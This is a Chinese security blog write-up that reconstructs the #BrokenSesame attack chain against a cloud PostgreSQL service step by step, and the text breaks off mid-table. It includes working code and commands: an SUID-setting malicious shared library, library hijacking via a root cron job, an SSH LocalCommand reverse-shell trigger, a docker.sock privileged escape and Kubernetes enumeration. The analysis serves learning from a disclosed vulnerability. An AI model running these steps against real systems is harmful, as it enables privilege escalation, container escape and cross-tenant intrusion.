#  揭秘天价漏洞BrokenSesame 技术细节   
sule01u  黑伞安全   2025-04-03 10:47  
  
   
  
# 云上攻防TOP级案例分析从0到1 - #BrokenSesame  
  
前几天 Wiz Research 团队分享了Ingress NGINX 中未经身份验证的远程代码执行漏洞，感兴趣大家可以去看：https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities。  
  
这让我又想起来 Wiz Research 团队2023年分享的#BrokenSesame  
案例，非常精彩。  
  
所以本文是对 Wiz Research 团队 2023 年公开的 AnalyticDB for PostgreSQL 服务中的高危漏洞链 "#BrokenSesame" 的详细分析，这个案例非常值得学习，接下来让我们通过第一视角来看看：开局你有一个容器的低权限用户。。。。  
  
文章包含每一步思路、操作、原理解释与学习重点。  
## 前情提要  
  
我们已经通过 PostgreSQL 的 RCE 漏洞进入了容器内部，拿到容器A的adbpgadmin  
 用户 shell .  
## 第一步目标：在数据库容器中提权至 Root  
  
进入容器后，获得了 adbpgadmin  
 用户权限。  
### 🧠 初始权限有什么限制？  
- • 高权限用户：no, 我们只有一个受限的adbpgadmin  
用户  
  
- • 共享命名空间：no  
  
- • 共享资源：no，不过发现了home目录是持久化存储（这很正常，用户数据需要持久化存储）  
  
除此之外，我们并没有进行更高风险的攻击操作的权限。  
### 🔍 如何寻找提权点？  
  
对容器A中进行信息收集: 检查文件系统，进程，网络等  
  
最终发现了一个定时任务文件：  
```
/etc/cron.d/tsar
```  
  
查看内容：  
```
* * * * * root /usr/bin/tsar --cron > /dev/null 2>&1
```  
  
也就是说：**每分钟都会有一个以 root 权限执行的 tsar 程序被触发**  
。  
### 🧠 tsar 是什么？可以劫持它吗？  
  
我们尝试使用 ldd  
 检查 /usr/bin/tsar  
 所依赖的动态链接库：  
  
![img](https://mmbiz.qpic.cn/mmbiz_jpg/apmYTPAKhlVjGDcq7325ZqWKrzvwV4dw0e1zZmlxRiciaJXgibDfzxhgOj1oyjCmwmdUBwQDl7FyuVjDEKerNia96Q/640?wx_fmt=other&from=appmsg "null")  
  
  
看到一个库路径有点特别，在/u01/adbpd  
下面；让查看一下具体信息：  
```
$: ls -alh /u01/adbpg/lib/libgcc_s.so.1 -rwxr-xr-x 1 adbpgadmin adbpgadmin 102K Oct 27 12:22 /u01/adbpg/lib/libgcc_s.so.1 
```  
  
wow，这个文件**是当前用户 adbpgadmin 拥有的，并且是可写的！**  
  
回顾一下：  
- • tsar 启动时会加载 libgcc_s.so.1  
  
- • 这个库在一个我当前用户可写目录下  
  
于是我们就有了计划：  
- • 如果可以用自己的共享库覆盖这个文件，那么下次 cronjob 任务执行时，我们注入的代码也会以 root 身份执行！  
  
### 🧪 编写恶意共享库，并提权  
- • **编译了一个共享库**  
，该库将 /bin/bash  
 复制到 /bin/dash  
，并将其设置为 **SUID**  
，以便我们能够以 **root**  
 身份执行代码。【Linux   
SUID  
权限允许用户执行一个程序时临时获取超级用户（root）的权限，即使该用户本身没有root权限】```
// evil.c#include <stdlib.h>#include <unistd.h>#include <sys/stat.h>void __attribute__((constructor)) init() {    // 拷贝 bash → dash，并设置 suid 位    system("cp /bin/bash /bin/dash");    chmod("/bin/dash", 04755);  // -rwsr-xr-x}
```  
  
  
- • **编译为共享库**```
gcc -shared -fPIC evil.c -o evil.so
```  
  
  
- • **使用 PatchELF 工具**  
，为 libgcc_s.so.1  
 添加了一个依赖项。这样在加载它时，我们自己的库也会被加载。```
cp /u01/adbpg/lib/libgcc_s.so.1 ./libfake.sopatchelf --add-needed evil.so libfake.somv libfake.so /u01/adbpg/lib/libgcc_s.so.1
```  
  
  
- • **覆盖了原始的 libgcc_s.so.1 库文件**  
。  
  
- • **等待 /usr/bin/tsar 被执行**  
。  
  
- • **验证权限**  
：现在我可以使用任何需要root权限的操作  
![](https://mmbiz.qpic.cn/mmbiz_jpg/apmYTPAKhlVjGDcq7325ZqWKrzvwV4dw2nYnUZvnxExaNbTylnDsC3SgRJ70WibIgibA6dx1TgzEpGVVNA8CcGug/640?wx_fmt=other&from=appmsg "null")  
  
  
### ✅ 为什么这个漏洞点很关键？  
- • 不需要利用系统级漏洞，仅使用了配置不当（ cronjob + 动态链接库）  
  
- • 无需额外权限，利用用户已有权限做修改  
  
- • 通过 cronjob 自动执行，无需复杂条件  
  
这是一种经典的 Linux 本地提权方式：**计划任务 + 动态链接库注入**  
。  
### 🧠 需要掌握的知识点  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">知识点</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">说明</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">cronjob 提权</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">如果可控二进制在计划任务中被 root 调用，可植入 payload</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">* 动态库注入</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><strong style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));font-weight: bold;text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: inherit;color: rgb(250, 81, 81);"><span leaf="">动态链接库查找路径不安全，是我们常用的劫持点</span></strong></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">SUID 权限</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">如果 SUID shell 被构造，任何人执行它都拥有 root 权限</span></section></td></tr></tbody></table>  
  
✅ 提权成功，我们获得了容器A内 root 权限。  
## 第二步：容器内横向移动与逃逸  
  
提权为 root 后，我们可以进一步探索容器是否与其他容器/宿主机共享资源，试图进行横向移动或逃逸。  
### 🔍 是否能直接逃逸？  
  
虽然我们拥有了容器 root 权限，但目前容器A依然是受限的隔离环境：  
- • 没有宿主机的 /  
 根目录  
  
- • 没有宿主机网络访问权限  
  
- • 没有访问 k8s API Server 的凭据  
  
所以，**如果没有额外突破，我们仍然“困”在这个容器中**  
。  
### 🕵️‍♀️ 观察平台行为：捕捉外部触发动作  
  
在容器A内部我们几乎没有啥进展，不过在过去的一年里，我们研究了多个csp的托管服务，发现客户从管理门户执行的操作经常导致在托管环境中创建各种容器和流程，从而潜在地扩大了横向移动的攻击面。于是我们开始回到控制台页面上，把所有能点击的功能点一点看看是否会有新发现。  
  
最终，我们在控制台看到了“启用 SSL 加密”功能，ssl加密意味着需要安装证书、证书又是文件意味着文件操作，而涉及的操作会打开新的攻击面：符号链接攻击、文件系统权限等，意味着可能容器会发生了一些更加值得探索的东西，让我们来看看，我们点击""启用""按钮  
  
![img](https://mmbiz.qpic.cn/mmbiz_jpg/apmYTPAKhlVjGDcq7325ZqWKrzvwV4dw7wfM9lVWZzBQCmBy0Cicj8qhLibx4XpcyzW73PpFuo41Z3ria3ksfxKFg/640?wx_fmt=other&from=appmsg "null")  
  
  
启用ssl加密后，我们观察一系列新的进程出来了，重点值得关注的信息如下：  
```
#: ps -eo uid,pid,cmdUID        PID                CMD0            2605606        runc init0            2605606        /bin/python /opt/adbpgmgmt.py0            2605620        mkdir -p /home/adbpgadmin/gpdb_ssl_files/0            2605626        su - adbpgadmin -c "scp / home/adbpgadmin/gpdb_ssl_files/* ..."
```  
- • runc init  
 意味着正在创建一个新的容器，但是我们能在我们的容器看到这个进程，基本也能说明共享了pid name space；  
  
- • /opt/adbpgmgmt.py  
 在我容器内并没有看到这个文件，意味着我们有不同的mount name space;  
  
- • /home/adbpgadmin/gpdb_ssl_files/  
 这个目录确实被创建了, 但是这个是其他容器运行的，说明我的/home/adbpgadmin/下很可能是跟他同步的，我们共享家目录。  
  
- • 用adbpgadmin 身份运行了 SCP命令 (scp 通过 ssh 连接在不同的机器中传输文件)  
  
```
# 通过scp将文件传输到容器B家目录, 而容器A、B又共享家目录su - adbpgadmin -c scp /home/adbpgadmin/xxx_ssl_files/* *REDACTED*:/home/adbpgadmin/data/master/seg-1/ /usr/bin/ssh -x -oForwardAgent=no -oPermitLocalCommand=no -oClearAllForwardings=yes -- *REDACTED* scp -d -t /home/adbpgadmin/data/master/seg-1/ 
```  
  
这个容器与我们的容器共享了 **PID 命名空间**  
（因为我们能看见这些进程）和 家目录。为了验证这一推测，我们编写了一个 Python 脚本，该脚本会等待一个名为 **SCP**  
 的进程启动（因为它是以我们的用户 adbpgadmin 运行的），然后通过路径 /proc/{pid}/root/ 访问该进程所在的文件系统。  
```
# 用于访问第二个容器B文件系统的 Python 脚本# 场景：在共享 PID 命名空间的容器中，通过进程扫描方式识别“另一个容器”中新启动的目标进程（scp），# 利用 /proc/{pid}/root/ 访问其所在容器B的文件系统。import psutilimport oslisted = set()  # 用于记录已处理的进程 ID，防止重复处理相同进程whileTrue:    for proc in psutil.process_iter():  # 遍历系统中所有进程        try:            processName = proc.name()       # 获取进程名，如 'scp'            processID = proc.pid            # 获取进程 PID            cmdLine = proc.cmdline()        # 获取进程的完整命令行            # 如果是新发现的 SCP 进程            if processID notin listed and processName == 'scp':                # 尝试访问该进程的 root 文件系统视图，利用的是 Linux 的 /proc/{pid}/root/                # * 如果该进程运行在共享PID命名空间的不同容器中，这个 root 实际指向的是另一个容器的根目录                os.system('ls -alh /proc/{}/root/'.format(processID))                # 将 PID 添加到已处理集合中，防止重复访问                listed.add(processID)        # 处理进程可能在获取信息前就结束、权限不足或僵尸进程的情况        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):            pass
```  
  
在再次启用 SSL 操作后，SCP 进程被触发，访问到了它的文件系统。  
  
**通过上述方法，我们对第二个容器进行了更多的信息收集，最终结论：虽然两个容器是不同的，但它们共享PID 命名空间、主目录（/home/adbpgadmin）是同一个挂载！**  
### 🧠 PS: 什么是共享 PID 命名空间？  
- • 多个容器共享进程视图，可以看到彼此的 PID 与 /proc 信息  
  
- • 如果 /proc//root 可访问，就可以“间接”访问另一个容器的文件系统  
  
### 🙋 怎么拿到容器B的权限？  
  
为了在容器B中执行代码，我想我们也许可以跟前面的定时任务的库注入一样，将自己的代码注入到sshd的进程中，但最终，我们想出了一个有趣简单的方案：  
  
由于每次重新启用 SSL 操作时，容器B的进程都会执行一次 SCP 命令，用的是adbpgadmin  
用户，而我们的家目录是共享的，因此我们可以修改我们当前用户adbpgadmin  
的 SSH 客户端配置文件 /home/adbpgadmin/.ssh/config  
。  
  
然后感谢openssh给我们提供了可配置的LocalCommand  
字段: 该字段定义了在 **成功建立连接之后**  
，由客户端在本地执行的一个命令  
  
💉  
利用 SSH 客户端配置注入命令  
  
修改共享目录下的 .ssh/config  
 文件, 平台操作ssl加密触发 ssh  
 命令  
```
Host *    PermitLocalCommand yes    LocalCommand /bin/sh /home/adbpgadmin/reverse-shell.sh
```  
  
现在我们在容器B中，但是是以 **adbpgadmin 用户**  
 执行命令的；  
**让我们回顾一下，示意图如下：**  
### 🚪 进一步提权  
  
然后我们将SUID二进制文件复制到共享的主目录，这样我们就可以在第二个容器中以根用户的身份执行代码。  
```
LocalCommand /home/adbpgadmin/dash -p -c '/home/adbpgadmin/dash -p -c /home/adbpgadmin/reverse-shell.sh' 2>/dev/null
```  
  
这样，脚本会以 root 身份执行，从而在 **容器 B**  
 中再次获得 root。  
  
我们进一步检查容器 B 的文件、进程、网络等，我们惊喜发现：  
- • 它是一个 --privileged  
 容器  
  
- • 🌟 挂载了 /run/docker.sock   
>> /run/docker.sock  
 是 Docker 引擎暴露在主机上的 Unix Socket 接口，容器如果能访问它，就等于可以 完全控制宿主机上的 Docker 引擎  
，从而做到提权、逃逸、横向攻击。  
  
  
  
鉴于第二个容器只是临时为执行操作（启用 SSL 加密）而创建的，我们利用暴露的 docker socket运行了一个**新的、持久存在的、特权容器**  
。该容器与宿主机（K8s 节点）共享相同的 PID、IPC、UTS、NET、USER 和 MOUNT 命名空间，并将宿主机的根目录挂载到了容器内的 /mnt。它会永久存在，并通过位于 /home/adbpgadmin 的共享管道，从我们无权限的原始容器中接收命令。  
  
我们立即利用它创建了一个“超级容器”：  
```
docker run -it --rm --privileged --net=host --pid=host -v /:/mnt alpine
```  
  
这个新容器 C 拥有：  
- • 宿主机完整 root 权限  
  
- • 宿主机的网络命名空间（可访问 Kubernetes API）  
  
- • 挂载了宿主机根目录 /mnt  
  
```
# 我们使用命名管道（FIFO）在新容器C执行命令# 在 Linux 中，命名管道（FIFO，全称 First-In-First-Out）是一种特殊文件，允许两个进程通过它进行一端写入、一端读取的通信。$: echo ‘id’ > /home/adbpgadmin/i_pipe; timeout 1 cat /home/adbpgadmin/o_pipeuid=0(root) gid=0(root) groups=10(wheel) # 访问宿主机文件系统$: echo ‘ls -alh /mnt’ > /home/adbpgadmin/i_pipe; timeout 2 cat /home/adbpgadmin/o_pipetotal 88 dr-xr-xr-x   23 root     root        4.0K Nov  6 10:07 . drwxr-xr-x    1 root     root        4.0K Nov  7 15:54 .. drwxr-x---    4 root     root        4.0K Nov  6 10:07 .kube lrwxrwxrwx    1 root     root           7 Aug 29  2019 bin -> usr/bin dr-xr-xr-x    5 root     root        4.0K Nov  2 10:21 boot drwxr-xr-x   17 root     root        3.1K Nov  6 10:08 dev drwxr-xr-x   84 root     root        4.0K Nov  6 10:08 etc drwxr-xr-x    3 root     root        4.0K Nov  2 10:24 flash drwxr-xr-x    6 root     root        4.0K Nov  6 10:11 home drwxr-xr-x    2 root     root        4.0K Nov  2 10:24 lafite lrwxrwxrwx    1 root     root           7 Aug 29  2019 lib -> usr/lib lrwxrwxrwx    1 root     root           9 Aug 29  2019 lib64 -> usr/lib64 drwx------    2 root     root       16.0K Aug 29  2019 lost+found drwxr-xr-x    2 root     root        4.0K Dec  7  2018 media drwxr-xr-x    3 root     root        4.0K Nov  6 10:07 mnt drwxr-xr-x   11 root     root        4.0K Nov  6 10:07 opt dr-xr-xr-x  184 root     root           0 Nov  6 10:06 proc dr-xr-x---   10 root     root        4.0K Nov  6 10:07 root 
```  
  
创建这个新的 “超级容器” 让我们能够逃逸到宿主机（K8s 节点），并最终访问到 Kubernetes 的 API server，因为我们现在与宿主机处于同一个网络命名空间中。  
  
**宿主机允许对外连接互联网，我们可以直接反弹 shell，而无需再依赖共享的命名管道。**  
  
✅ 提权成功，我们获得了容器B的root 权限，并创建了一个持久化的特权容器C。  
### 📜 需要掌握的知识点  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">知识点</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">说明</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><code style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-feature-settings: normal;font-variation-settings: normal;font-size: 12.6px;text-align: left;line-height: 1.75;color: rgb(221, 17, 68);background: rgba(27, 31, 35, 0.05);padding: 3px 5px;border-radius: 4px;"><span leaf="">/proc/&lt;pid&gt;/root/</span></code></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">可访问进程的根目录，探测文件系统</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">共享 PID 命名空间</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">多容器共享进程空间，可互相监视、分析</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">Volume 挂载共享</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">我们可用挂载目录作为通信通道</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">SSH LocalCommand</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">改写ssh配置实现“RCE”</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">docker.sock 利用</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">docker api, 可创建新容器、镜像等。</span><span leaf=""><br/></span><span style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;color: rgb(87, 107, 149);"><span leaf="">docker api指南</span></span></section></td></tr></tbody></table>  
## 第三步：访问 Kubernetes API  
### 🧭 为什么要访问 Kubernetes API server？  
  
因为当前的数据库平台是基于 Kubernetes 构建的托管环境，k8s之间的节点是独立的，但是他们有一条纽带相连接，那就是k8s本身，k8s通过API 将节点联系在一起,控制平面能力掌握在 Kubernetes API Server 中，我们现在在其中一个节点，意味着我们也拥有自己的serveraccount token  
。  
  
一旦你可以访问 API Server，潜在攻击面如下：  
- • 列出所有 Pod 与命名空间  
  
- • 访问 Secrets、ConfigMap 等敏感配置  
  
- • 检查平台使用的镜像、容器运行配置  
  
- • 判断是否为多租户共享集群，存在横向威胁  
  
### 🧪 枚举 Pod，发现多租户痕迹  
```
$: /tmp/kubectl get pods NAME                                                                       READY   STATUS      RESTARTS   AGE gp-4xo3*REDACTED*-master-100333536                                      1/1     Running     0          5d1h gp-4xo3*REDACTED*-master-100333537                                      1/1     Running     0          5d1h gp-gw87*REDACTED*-master-100292154                                      1/1     Running     0          175d gp-gw87*REDACTED*-master-100292155                                      1/1     Running     0 ... 
```  
  
**通过访问 K8s API server，我们利用节点的serveraccount凭据检查各种集群资源，包括secret、sa和 pod。检查 pod 列表时，我们不仅看到自己的pod， 还发现其他租户的 pod，这说明了当前是一个多租户集群，这意味着我们有可能获得对这些 pod 的跨租户访问权限。**  
### 💡 初学者要点总结  
  
<table><thead><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">概念</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">说明</span></section></td></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">kubeconfig</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">Kubernetes API 的凭据配置文件</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0px;border-style: solid;border-color: hsl(var(--border));"><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">Kubelet</span></section></td><td style="box-sizing: border-box;border: 1px solid rgb(223, 223, 223);text-align: left;line-height: 1.75;font-family: -apple-system-font, BlinkMacSystemFont, &#34;Helvetica Neue&#34;, &#34;PingFang SC&#34;, &#34;Hiragino Sans GB&#34;, &#34;Microsoft YaHei UI&#34;, &#34;Microsoft YaHei&#34;, Arial, sans-serif;font-size: 14px;padding: 0.25em 0.5em;color: rgb(63, 63, 63);word-break: keep-all;"><section><span leaf="">每个节点上的 Kubernetes 